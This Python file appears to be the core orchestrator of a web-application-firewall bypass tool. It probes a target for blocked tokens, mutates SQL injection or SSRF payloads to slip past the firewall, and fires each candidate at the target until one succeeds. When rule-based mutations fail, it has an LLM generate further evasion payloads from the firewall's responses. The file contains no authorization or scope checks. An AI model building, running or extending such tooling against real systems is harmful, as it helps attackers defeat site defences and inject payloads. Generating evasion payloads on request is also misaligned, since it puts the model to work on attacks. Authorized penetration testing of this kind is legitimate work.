import logging
from typing import Dict, List, Any, Optional
from pydantic import BaseModel

from .client import WafClient
from .prober import WafProber, BlockMap
from .mutators.encoder import EncoderMutator
from .mutators.sql import SqlMutator
from .mutators.ssrf import SsrfMutator
from .llm import LlmClient

# Configure logger
logger = logging.getLogger("waf_bypasser.core")

class BypassResult(BaseModel):
    success: bool
    payload: Optional[str] = None
    block_map: Dict[str, List[str]]
    attempts: int
    log: List[Dict[str, Any]]

class WafBypasser:
    """
    Main orchestrator that runs token probing, heuristic mutators,
    and fallback LLM feedback loop to bypass WAFs.
    """

    def __init__(
        self,
        target_url: str,
        base_payload: str,
        param_name: Optional[str] = None,
        method: str = "GET",
        headers: Optional[Dict[str, str]] = None,
        cookies: Optional[Dict[str, str]] = None,
        proxy: Optional[str] = None,
        vuln_type: str = "sql",  # "sql", "ssrf", "xss", "generic"
        use_llm: bool = False,
        llm_provider: str = "gemini",
        llm_api_key: Optional[str] = None,
        max_llm_iterations: int = 3,
        rate_limit_delay: float = 0.1,
    ):
        self.target_url = target_url
        self.base_payload = base_payload
        self.param_name = param_name
        self.vuln_type = vuln_type.lower()
        self.use_llm = use_llm
        self.max_llm_iterations = max_llm_iterations

        # Initialize WafClient
        self.client = WafClient(
            base_url=target_url,
            method=method,
            headers=headers,
            cookies=cookies,
            proxy=proxy,
            rate_limit_delay=rate_limit_delay
        )

        # Initialize LLM client if requested
        self.llm_client = None
        if self.use_llm:
            self.llm_client = LlmClient(provider=llm_provider, api_key=llm_api_key)

        self.history: List[Dict[str, Any]] = []
        self.tested_payloads = set()

    def run(self) -> BypassResult:
        """
        Runs the full bypass routine.
        """
        logger.info(f"Starting WAF-Bypasser run on target: {self.target_url}")
        
        # 1. Probe target and build BlockMap
        prober = WafProber(client=self.client, param_name=self.param_name)
        block_map = prober.probe_all()

        # 2. Build heuristic mutators list
        mutators = [EncoderMutator()]
        if self.vuln_type == "sql":
            mutators.append(SqlMutator())
        elif self.vuln_type == "ssrf":
            mutators.append(SsrfMutator())

        # Generate candidates via rule-based mutators
        logger.info("Generating candidate payloads using heuristic mutators...")
        heuristic_candidates = []
        for mutator in mutators:
            heuristic_candidates.extend(mutator.mutate(self.base_payload, block_map))
        
        # Remove duplicates
        heuristic_candidates = list(set(heuristic_candidates))
        logger.info(f"Generated {len(heuristic_candidates)} unique heuristic candidate payloads.")

        # Test heuristic candidates
        for idx, candidate in enumerate(heuristic_candidates):
            if candidate in self.tested_payloads:
                continue
            self.tested_payloads.add(candidate)

            logger.info(f"Testing heuristic payload {idx+1}/{len(heuristic_candidates)}: {repr(candidate)}")
            res = self.client.send_payload(candidate, param_name=self.param_name)
            
            # Log attempt
            attempt_log = {
                "source": "heuristic",
                "payload": candidate,
                "is_blocked": res["is_blocked"],
                "status_code": res["status_code"],
                "length": res["length"],
            }
            self.history.append(attempt_log)

            if res["success"]:
                logger.info(f"Bypass SUCCESS with heuristic payload: {repr(candidate)}")
                return BypassResult(
                    success=True,
                    payload=candidate,
                    block_map=block_map.to_dict(),
                    attempts=len(self.tested_payloads),
                    log=self.history
                )

        # 3. If heuristics failed and LLM is enabled, enter LLM feedback loop
        if self.use_llm and self.llm_client:
            logger.info("All heuristic payloads failed. Entering LLM feedback loop...")
            
            # We will use the metadata from the latest failed request for the prompt context
            last_resp = self.history[-1] if self.history else {"status_code": 403, "length": 0, "text": "Access Denied"}

            for iteration in range(self.max_llm_iterations):
                logger.info(f"LLM feedback loop iteration {iteration+1}/{self.max_llm_iterations}")
                
                # Get new proposals from LLM
                llm_candidates = self.llm_client.generate_mutations(
                    base_payload=self.base_payload,
                    block_map=block_map.to_dict(),
                    waf_response_summary=last_resp,
                    vuln_type=self.vuln_type
                )

                if not llm_candidates:
                    logger.warning("LLM generated no new candidates or failed.")
                    break

                for candidate in llm_candidates:
                    if candidate in self.tested_payloads:
                        continue
                    self.tested_payloads.add(candidate)

                    logger.info(f"Testing LLM-proposed payload: {repr(candidate)}")
                    res = self.client.send_payload(candidate, param_name=self.param_name)
                    
                    attempt_log = {
                        "source": f"llm_iter_{iteration+1}",
                        "payload": candidate,
                        "is_blocked": res["is_blocked"],
                        "status_code": res["status_code"],
                        "length": res["length"],
                    }
                    self.history.append(attempt_log)

                    if res["success"]:
                        logger.info(f"Bypass SUCCESS with LLM-proposed payload: {repr(candidate)}")
                        return BypassResult(
                            success=True,
                            payload=candidate,
                            block_map=block_map.to_dict(),
                            attempts=len(self.tested_payloads),
                            log=self.history
                        )
                    
                    # Update last response summary for next iteration context
                    last_resp = attempt_log

        # If we got here, all attempts failed
        logger.warning("WAF bypass failed. No payloads succeeded.")
        return BypassResult(
            success=False,
            payload=None,
            block_map=block_map.to_dict(),
            attempts=len(self.tested_payloads),
            log=self.history
        )
